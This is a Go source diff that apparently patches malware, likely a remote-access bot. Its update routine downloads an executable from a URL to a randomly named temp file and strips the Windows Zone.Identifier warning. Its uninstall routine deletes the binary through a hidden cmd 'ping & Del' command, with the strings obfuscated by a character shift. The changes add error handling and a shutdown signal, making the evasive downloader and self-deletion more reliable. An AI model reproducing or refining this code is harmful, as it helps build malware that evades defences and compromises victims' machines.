@@ -183,10 +183,14 @@ func update(version, file, md5 string) { //Version, File URL, File MD5 ( update(
 		n := randomString(5, false)
 		output, _ := os.Create(tmpPath + n + ".exe")
 		defer output.Close()
-		response, _ := http.Get(file)
-		defer response.Body.Close()
-		_, err := io.Copy(output, response.Body)
+		response, err := http.Get(file)
 		if err != nil {
+			return
+		}
+		defer response.Body.Close()
+		_, err = io.Copy(output, response.Body)
+		if err != nil {
+			return
 		}
 		//Remove the Zone ID
 		_ = os.Remove(tmpPath + n + ".exe" + deobfuscate("/fyf;[pof/Jefoujgjfs"))
@@ -245,6 +249,7 @@ func uninstall() {
 		goodbye := exec.Command("cmd", "/Q", "/C", deobfuscate("qjoh!2/2/2/2!.o!2!.x!5111!?!Ovm!'!Efm!")+os.Args[0])
 		goodbye.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
 		goodbye.Start()
+		quit <- struct{}{}
 		os.Exit(0)
 	}
 }
